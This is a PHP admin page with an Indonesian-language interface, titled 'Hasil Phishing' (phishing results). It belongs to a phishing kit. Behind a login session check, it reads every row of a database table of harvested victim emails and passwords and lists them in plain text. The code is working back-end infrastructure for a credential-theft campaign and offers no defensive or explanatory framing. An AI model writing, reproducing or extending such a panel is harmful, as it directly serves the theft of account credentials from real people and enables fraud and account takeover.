<?php
session_start();
if (!isset($_SESSION['username'])) {
  header("Location: index.php");
  exit();
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Result Phishing</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-200">

  <div class="min-h-screen flex flex-col md:flex-row">

    <!-- Sidebar -->
    <aside class="bg-purple-700 text-white w-full md:w-64 p-6">
      <h2 class="text-2xl font-bold mb-6">Hasil Phishing</h2>
      <nav class="space-y-4">
        <a href="#" class="block py-2 px-4 rounded hover:bg-purple-600">Menu Utama</a>
        <a href="logout.php" onclick="return confirm('Apakah Yakin?')" class="block py-2 px-4 rounded bg-red-500 hover:bg-red-600 mt-6">Logout</a>
      </nav>
    </aside>

    <!-- Main Content -->
    <main class="flex-1 p-6">
      <h1 class="text-3xl font-bold mb-6">Hasil Phishing 🗿</h1>

      <div class="bg-white rounded-lg shadow-md p-4 overflow-x-auto">
        <table class="min-w-full table-auto text-sm text-left text-gray-700">
          <thead class="bg-purple-600 text-white">
            <tr>
              <th class="px-4 py-2">No</th>
              <th class="px-4 py-2">Email</th>
              <th class="px-4 py-2">Password</th>
            </tr>
          </thead>
          <tbody>
            <?php
              include '../koneksi.php';
              $sql = "SELECT * FROM tb_hasil";
              $result = $conn->query($sql);
              $no = 1;

              if ($result->num_rows > 0):
                while ($row = $result->fetch_assoc()):
            ?>
              <tr class="border-b hover:bg-gray-100">
                <td class="px-4 py-2"><?php echo $no++; ?></td>
                <td class="px-4 py-2"><?php echo htmlspecialchars($row['email']); ?></td>
                <td class="px-4 py-2"><?php echo htmlspecialchars($row['password']); ?></td>
              </tr>
            <?php
                endwhile;
              else:
            ?>
              <tr>
                <td colspan="3" class="text-center px-4 py-4 text-gray-500">Tidak ada data ditemukan.</td>
              </tr>
            <?php endif; $conn->close(); ?>
          </tbody>
        </table>
      </div>
    </main>

  </div>

</body>

</html>
